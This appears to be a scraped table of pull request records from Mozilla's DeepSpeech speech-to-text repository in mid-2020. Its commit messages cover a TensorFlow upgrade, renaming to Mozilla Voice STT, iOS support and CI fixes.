628,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3227,3227,Move to TensorFlow r2.3,,lissyx,1645737,2020-08-05T17:09:33Z,COLLABORATOR,True,54,34,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8619665fe1a29df3db3f246573fab2e0a4b5fe09,Move to TensorFlow r2.3
629,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3224,3224,Electron example,,lissyx,1645737,2020-08-04T19:30:32Z,COLLABORATOR,True,14,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bb24fc89f03e27c8f8970209097443f3d7ed2f45,Electron example
630,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3223,3223,Fix wrong repo/branch for examples,,lissyx,1645737,2020-08-04T19:28:30Z,COLLABORATOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9586ac42126a091edcddffb75cf5dfa09aa80adb,Fix wrong repo/branch for examples
631,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3222,3222,Electron example,,lissyx,1645737,2020-08-04T12:17:42Z,COLLABORATOR,True,16,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7fbbfeba821bad12aedc9ed0508a6e8c3e1040b6,Electron example
632,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3221,3221,"Rename bindings, docs, shared libraries, headers",,reuben,477142,2020-08-04T10:15:48Z,MEMBER,False,1323,1487,179,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fa2191104878fed468cb16cc8782c345c98ff7aa,"Rename packages, modules, headers, shared libraries to Mozilla Voice STT"
633,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3221,3221,"Rename bindings, docs, shared libraries, headers",,reuben,477142,2020-08-04T10:15:48Z,MEMBER,False,1323,1487,179,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ee7bf86460f106ee109e458fea6c0aca1450ebf7,.NET rename
634,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3221,3221,"Rename bindings, docs, shared libraries, headers",,reuben,477142,2020-08-04T10:15:48Z,MEMBER,False,1323,1487,179,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,213590b3265ff486eb65bca65e305929d4b9763b,Java rename
635,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3221,3221,"Rename bindings, docs, shared libraries, headers",,reuben,477142,2020-08-04T10:15:48Z,MEMBER,False,1323,1487,179,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b18639f9c4ff4335b39703b06991a153c0d97177,Swift rename
636,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3221,3221,"Rename bindings, docs, shared libraries, headers",,reuben,477142,2020-08-04T10:15:48Z,MEMBER,False,1323,1487,179,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b86a92a5b34594b1a5450f86b22e8f97c87c7d7d,C docs
637,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3221,3221,"Rename bindings, docs, shared libraries, headers",,reuben,477142,2020-08-04T10:15:48Z,MEMBER,False,1323,1487,179,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5449f21a47df3365e297c3e93e8281675dc36ae1,Python rename
638,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3221,3221,"Rename bindings, docs, shared libraries, headers",,reuben,477142,2020-08-04T10:15:48Z,MEMBER,False,1323,1487,179,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b301cdf83ec31ab6c0252ab5926875fb5c8525cd,JavaScript rename
639,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3221,3221,"Rename bindings, docs, shared libraries, headers",,reuben,477142,2020-08-04T10:15:48Z,MEMBER,False,1323,1487,179,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ee1235678dc6207815ce4e7fc9b1f13a5836a1d5,Missing renames in CI scripts
640,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3221,3221,"Rename bindings, docs, shared libraries, headers",,reuben,477142,2020-08-04T10:15:48Z,MEMBER,False,1323,1487,179,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4d726e820df6110f63062848ea5747f6bfb9e996,More renames
641,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3221,3221,"Rename bindings, docs, shared libraries, headers",,reuben,477142,2020-08-04T10:15:48Z,MEMBER,False,1323,1487,179,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8c840bed239f83569a6c2d1577fb0fba8be3e78d,"Fix .NET build/package, resolve package conflict in Java app"
642,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3221,3221,"Rename bindings, docs, shared libraries, headers",,reuben,477142,2020-08-04T10:15:48Z,MEMBER,False,1323,1487,179,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4d98958b778ae4010ce938fa79f700d6a75a2722,iOS: Re-share workspace schemes and fix packaging
643,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3221,3221,"Rename bindings, docs, shared libraries, headers",,reuben,477142,2020-08-04T10:15:48Z,MEMBER,False,1323,1487,179,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bef8d46797e11855b40776203580c35ac6d8bd81,Address review comments
644,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3220,3220,Fix #3181: Use finer-grained gcp workers,,lissyx,1645737,2020-08-04T09:16:50Z,COLLABORATOR,True,274,91,185,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,107bda06025226ed614165b18fda491360bcfdbf,Fix #3181: Use finer-grained gcp workers
645,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3219,3219,Fix #3207: do not force -shared on the linkage,,lissyx,1645737,2020-08-03T20:06:29Z,COLLABORATOR,True,24,24,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,93cae64ddcb7803dc02d27b150d2c4b8a5681221,Fix #3207: do not force -shared on the linkage
646,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3218,3218,Fix #3181: Use finer-grained gcp workers,,lissyx,1645737,2020-08-03T16:34:06Z,COLLABORATOR,True,274,91,185,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,040f5eb2a3ccde75484aba510cdba0479f35bac6,Fix #3181: Use finer-grained gcp workers
647,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3217,3217,Examples 0.8,,lissyx,1645737,2020-08-03T12:08:40Z,COLLABORATOR,True,1435,8,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a6164db5df2f98000d50d061f43e92d93ed23084,Refer to r0.8 branch for examples and badges
648,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3217,3217,Examples 0.8,,lissyx,1645737,2020-08-03T12:08:40Z,COLLABORATOR,True,1435,8,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e64ae57e836628c35338c20dbfb9aa7b2180d984,Fix #3198: Do not rely on examples repo for building .Net
649,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3217,3217,Examples 0.8,,lissyx,1645737,2020-08-03T12:08:40Z,COLLABORATOR,True,1435,8,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7cb2b501385b0089513eabf94d458964ebd96ce1,Update examples model to match new naming
650,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3216,3216,Refer to 0.8.0 models for docs / swift code,,lissyx,1645737,2020-08-03T12:05:04Z,COLLABORATOR,True,12,12,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f54ff7897e6ea267d557919d201dc1dd7e5317f3,Refer to 0.8.0 models for docs / swift code
651,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3215,3215,Win workers r0.8,,lissyx,1645737,2020-08-03T09:02:01Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,30f75f1f68dfdf2f06897bf570bbeffa9fe964be,Fix #3211: Use win + win-gpu set
652,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3214,3214,Fix #3211: Use win + win-gpu set,,lissyx,1645737,2020-08-03T09:01:09Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b6edcbe08c121af8f9e606d4d18d9d2b472c6ae0,Fix #3211: Use win + win-gpu set
653,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3213,3213,Remove mention of TensorFlow docs for CUDA requirements,I don't think this was adding any useful information and because we have different training and inference versions right now it adds to the confusion a bit.,reuben,477142,2020-08-03T07:23:46Z,MEMBER,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,350575ba44216cb06a893dd7bd020a3150fdbbb0,Remove mention of TensorFlow docs for CUDA requirements
654,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3212,3212,"Decoder docs: UTF-8 -> Bytes output mode, and link to scorer-scripts (Closes #2978)",,reuben,477142,2020-08-03T07:17:09Z,MEMBER,True,12,8,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d9f9d6ed89acdce81f0265dbc06392b132a67429,"Decoder docs: UTF-8 -> Bytes output mode, and link to scorer-scripts"
655,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3209,3209,Create generate_package.py,Missing  generate_package.py for making scorer.,thisisreza,59033241,2020-08-01T07:55:16Z,NONE,False,154,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,deae64885b96f3c13aef601247b56df950ba41d9,"Create generate_package.py

Missing  generate_package.py for making scorer."
656,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3208,3208,Fix #3207: do not force -shared on the linkage,,lissyx,1645737,2020-08-01T02:34:14Z,COLLABORATOR,True,24,24,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6d5d97abc4d5d5f5d2a225e7bc89f26f9559e855,Fix #3207: do not force -shared on the linkage
657,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3206,3206,Fix alphabet logic in generate_scorer_package.,Fixes #3205,mrstegeman,457381,2020-07-31T20:47:00Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3024cffe49296af02c39a3eb70075aeabd989635,"Fix alphabet logic in generate_scorer_package.

Fixes #3205"
658,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3204,3204,Fix #3198: Do not rely on examples repo for building .Net,,lissyx,1645737,2020-07-31T14:55:36Z,COLLABORATOR,True,1430,3,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c55143d282388a6719d7817580b462705755116c,Fix #3198: Do not rely on examples repo for building .Net
659,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3203,3203,Test rename to see what breaks,,reuben,477142,2020-07-31T10:05:46Z,MEMBER,False,628,630,76,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,34c99e5aec5a73cee9b07deb6ceb3df527d29d55,Test rename to see what breaks
660,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3203,3203,Test rename to see what breaks,,reuben,477142,2020-07-31T10:05:46Z,MEMBER,False,628,630,76,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,03869913cee46ea4e1e2fe1f8d4adaeb983d734f,More renames
661,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3203,3203,Test rename to see what breaks,,reuben,477142,2020-07-31T10:05:46Z,MEMBER,False,628,630,76,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1b473705a5ec3d8a8001053ff5b4d16f92fd4959,Even more renames
662,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3203,3203,Test rename to see what breaks,,reuben,477142,2020-07-31T10:05:46Z,MEMBER,False,628,630,76,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6b1f450f3be99031815f02cfed6a5ed2d6d30bfc,"One rename too many, examples CI"
663,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3203,3203,Test rename to see what breaks,,reuben,477142,2020-07-31T10:05:46Z,MEMBER,False,628,630,76,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b0551d076cf3e1988d635d647a5be3075b8c68ea,"Two more renames, rebase to up-to-date master"
664,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3201,3201,Update examples model to match new naming,,reuben,477142,2020-07-30T20:39:37Z,MEMBER,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4b10f0b8406fed4509847db2c127cad43edf3748,Update examples model to match new naming
665,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3199,3199,Upload both native_client and .framework for iOS tasks,,reuben,477142,2020-07-30T18:33:41Z,MEMBER,True,2,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c8441d1f8d6dd97d603f607110c105be60970186,Upload both native_client and .framework for iOS tasks
666,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3196,3196,Bump VERSION to 0.8.0,,lissyx,1645737,2020-07-30T14:22:37Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,412ad4d9c96e4812ddd515507ba2e56b6f3a36ea,Bump VERSION to 0.8.0
667,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3195,3195,Remove unused Scorer method,"This method was made unused by https://github.com/mozilla/DeepSpeech/pull/3021
after reports such as https://github.com/mozilla/DeepSpeech/issues/3004
of confusion interpreting the confidence values.",reuben,477142,2020-07-30T09:23:02Z,MEMBER,True,0,50,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6141740f8922fbfd8a1b8dae325773e9f757630b,"Remove unused Scorer method

This method was made unused by https://github.com/mozilla/DeepSpeech/pull/3021
after reports such as https://github.com/mozilla/DeepSpeech/issues/3004
of confusion interpreting the confidence values."
668,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3193,3193,Empty spaces,,lissyx,1645737,2020-07-28T08:36:53Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3bbabbc87c4f7f2978db6d3642ec61a6c4974f26,Empty spaces
669,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3192,3192,Remove external scorer file and documentation and flag references,,reuben,477142,2020-07-27T19:10:00Z,MEMBER,True,6,14,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2835151951094e167d5d2c767f01f5f2337c1cbb,Remove external scorer file and documentation and flag references
670,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3192,3192,Remove external scorer file and documentation and flag references,,reuben,477142,2020-07-27T19:10:00Z,MEMBER,True,6,14,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,216da91842ca38a4c56f0f8412eee7fabb89f322,Remove Git LFS from docs
671,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3191,3191,iOS microphone streaming,,reuben,477142,2020-07-27T18:30:21Z,MEMBER,True,398,182,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,35d2908db9b273cf8c727994ea337a55fb84c214,Add support for microphone streaming in swift native client test project
672,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3191,3191,iOS microphone streaming,,reuben,477142,2020-07-27T18:30:21Z,MEMBER,True,398,182,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e3c34b29d6a1a8a9603a280a8004f5c3e7f12f94,Small adjustments to avoid hardcoding filenames and avoid generic DeepSpeech name
673,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3189,3189,Support for microphone streaming in swift native client test project,"This adds support for microphone streaming to the Swift native client test project.

The audio is recorded via `AVCaptureSession` and converted from any input format to 16000Hz via the `AudioConverter` API.

I moved the code for recognizing an audio file together with the new code for recognizing microphone input into a new `DeepSpeech.swift`.

Because I did not want to commit my project file because of many unrelated changes, @reuben maybe you could commit a new proj file where `DeepSpeech.swift` and `AudioContext.swift` are included.

Because the file transcription did not work for me before this has to be tested. The microphone streaming works great and prints intermediate results and final result to the console. One could think of adding an event handler for results to DeepSpeech.swift so the ContentView can add a listener and display the results nicely.

The captured audio data is recorded and written into a `recording.pcm` file. As a note: not the original audio is saved, but the audio after conversion to 16000 Hz. The file can be easily opened with Adobe Audition for example. This way you can check for yourself that the capturing and conversion works. The file can be downloaded by downloading the app container from the device in the `Devices & Simulators` dialog in XCode.",erksch,19290349,2020-07-27T15:06:55Z,CONTRIBUTOR,False,400,181,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cbf9a8d2570a22770eafb85aee6afd04131c47e1,Add support for microphone streaming in swift native client test project
674,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3188,3188,Fix #3187: update msys2 installer,,lissyx,1645737,2020-07-27T11:06:36Z,COLLABORATOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e13804321f554161a523d8df3f7b951c09daea7a,Fix #3187: update msys2 installer
675,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3186,3186,Update r0.8,,lissyx,1645737,2020-07-27T08:31:20Z,COLLABORATOR,True,3114,434,80,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,058f53af3ab66082b1e566c9e6c0c19e6c77020f,"Update TRAINING.rst

I'm new to DeepSpeech, but I noticed when following the training instructions that the filenames _appear_ to be relative paths in the CSV. Let me know if I'm misinterpreting.

Thanks!"
676,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3186,3186,Update r0.8,,lissyx,1645737,2020-07-27T08:31:20Z,COLLABORATOR,True,3114,434,80,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,36a2f3b38d7527e3603e96692f449b773a5b6fff,"Update TRAINING.rst

Update wording on relative / absolute paths."
677,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3186,3186,Update r0.8,,lissyx,1645737,2020-07-27T08:31:20Z,COLLABORATOR,True,3114,434,80,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e1626c667e393fa01b06544bcaa8763eb48c45f0,"Merge pull request #3149 from karansag/patch-1

Update TRAINING.rst"
678,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3186,3186,Update r0.8,,lissyx,1645737,2020-07-27T08:31:20Z,COLLABORATOR,True,3114,434,80,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0e8a28de578aa36e8040774952515b5c029ba6da,Bump caches and fix linker issues in new workers
679,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3186,3186,Update r0.8,,lissyx,1645737,2020-07-27T08:31:20Z,COLLABORATOR,True,3114,434,80,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,972f3031fe372373ad9fd9779a7c0cc0d205257e,Merge branch 'new-workers' (Fixes #3168)
680,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3186,3186,Update r0.8,,lissyx,1645737,2020-07-27T08:31:20Z,COLLABORATOR,True,3114,434,80,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3ce07afae045ce9bf014a36719a0dfec75662187,Add TensorFlow iOS tasks
681,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3186,3186,Update r0.8,,lissyx,1645737,2020-07-27T08:31:20Z,COLLABORATOR,True,3114,434,80,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c85f95f781ee8c007502bcfc4ab2e24fc3e3e24c,Add DeepSpeech iOS tasks
682,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3186,3186,Update r0.8,,lissyx,1645737,2020-07-27T08:31:20Z,COLLABORATOR,True,3114,434,80,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4ca0f94d78658d4b57c784197046c669122c7b7d,client.cc iOS build
683,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3186,3186,Update r0.8,,lissyx,1645737,2020-07-27T08:31:20Z,COLLABORATOR,True,3114,434,80,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a1aa873259a96d12969039fdc958d9a2d9243ec3,Embed bitcode when linking
684,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3186,3186,Update r0.8,,lissyx,1645737,2020-07-27T08:31:20Z,COLLABORATOR,True,3114,434,80,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a274c26a89c7fb4334473b8f715325c8e1e5c30d,Add Swift wrapper framework
685,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3186,3186,Update r0.8,,lissyx,1645737,2020-07-27T08:31:20Z,COLLABORATOR,True,3114,434,80,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f7c50663e1094631b1b6931aba5cb19cd695ac71,Checkout fixed formulas commit in tf_tc-brew.sh
686,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3186,3186,Update r0.8,,lissyx,1645737,2020-07-27T08:31:20Z,COLLABORATOR,True,3114,434,80,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e8d642bf44c9285f33efc0cba05e28d45e0cbad4,Bump TensorFlow to remove usage of -z linker keyword on iOS
687,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3186,3186,Update r0.8,,lissyx,1645737,2020-07-27T08:31:20Z,COLLABORATOR,True,3114,434,80,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6c38d569685a8209295ccc021607e408b60c0d05,Use submodule TF tc-vars.sh
688,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3186,3186,Update r0.8,,lissyx,1645737,2020-07-27T08:31:20Z,COLLABORATOR,True,3114,434,80,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2f568e77858c8bea93c67362b0f16c458bf481f7,Don't use BAZEL_OPT_FLAGS in iOS builds
689,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3186,3186,Update r0.8,,lissyx,1645737,2020-07-27T08:31:20Z,COLLABORATOR,True,3114,434,80,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,aa8e9b064736c3c483391ccc62eacf61eb8bd472,Use correct build flags for ARM64 vs x86_64
690,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3186,3186,Update r0.8,,lissyx,1645737,2020-07-27T08:31:20Z,COLLABORATOR,True,3114,434,80,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f0f4b0ddc17317c4f809898265eb6f422dfc328f,Remove even more bazel flags
691,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3186,3186,Update r0.8,,lissyx,1645737,2020-07-27T08:31:20Z,COLLABORATOR,True,3114,434,80,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,be43b3fdc1ba0636e9a716a796d2ebb117485957,Bump caches for artifacts rebuilt on new worker
692,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3186,3186,Update r0.8,,lissyx,1645737,2020-07-27T08:31:20Z,COLLABORATOR,True,3114,434,80,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,de7a249fcd9c7e5f3eebdee4357626d8098569d9,Fix linker issues during tests with new workers
693,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3186,3186,Update r0.8,,lissyx,1645737,2020-07-27T08:31:20Z,COLLABORATOR,True,3114,434,80,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5e5db17371f167c57ad8255e8324629acf1dea7d,Address review comments
694,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3186,3186,Update r0.8,,lissyx,1645737,2020-07-27T08:31:20Z,COLLABORATOR,True,3114,434,80,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d9dac13343b634996e0875770b7cd70259e60060,Clean up tf_tc-build.sh
695,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3186,3186,Update r0.8,,lissyx,1645737,2020-07-27T08:31:20Z,COLLABORATOR,True,3114,434,80,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,267287861867d581f500cfc748c30ea3501a9608,Add docs to Swift bindings and missing methods
696,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3186,3186,Update r0.8,,lissyx,1645737,2020-07-27T08:31:20Z,COLLABORATOR,True,3114,434,80,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ffcec7f9aa8112390bcf6b990f126f94674664a6,"Merge pull request #3150 from mozilla/ios-build

iOS support"
697,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3186,3186,Update r0.8,,lissyx,1645737,2020-07-27T08:31:20Z,COLLABORATOR,True,3114,434,80,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a982a61d838b80787b3486b8be314e40304e8584,Resolves #3146 - Let build_sdb.py also output CSV files and rename it accordingly
